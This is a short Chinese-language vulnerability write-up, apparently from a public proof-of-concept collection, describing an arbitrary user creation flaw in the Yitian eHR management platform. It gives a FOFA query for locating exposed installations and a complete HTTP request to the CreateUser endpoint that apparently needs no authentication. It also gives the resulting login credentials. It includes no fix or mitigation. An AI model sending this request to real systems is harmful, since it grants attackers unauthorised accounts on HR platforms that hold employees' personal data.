# 易天智能eHR管理平台任意用户添加漏洞

# 一、漏洞简介
温州市易天信息科技有限公司主要经营易天人力资源管理软件，是一家致力于人力资源管理软件产品研发的高科技公司。易天智能eHR管理平台任意用户添加漏洞。

# 二、影响版本
+ 易天智能eHR管理平台

# 三、资产测绘
+ fofa`body="易天智能eHR管理平台"`
+ 特征

![1718096150529-b6101510-1a4e-42f4-9b0a-38dbbaf92413.png](./img/7NhBaRDdWCQjtuoK/1718096150529-b6101510-1a4e-42f4-9b0a-38dbbaf92413-675308.png)

# 四、漏洞复现
```java
GET /BaseManage/UserAPI/CreateUser?Account=stc&Password=123456&OuterID=888 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Connection: close
Priority: u=1
```

![1718096186064-dd4d0eb4-c477-44e1-ac5e-17c9af82501e.png](./img/7NhBaRDdWCQjtuoK/1718096186064-dd4d0eb4-c477-44e1-ac5e-17c9af82501e-082644.png)

```java
stc/123456	
```

![1718096231861-03ab519f-7e9b-4e3e-badb-83c3623f1bcd.png](./img/7NhBaRDdWCQjtuoK/1718096231861-03ab519f-7e9b-4e3e-badb-83c3623f1bcd-006610.png)



> 更新: 2024-06-23 23:42:48  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bub8xu5moq1cvagp>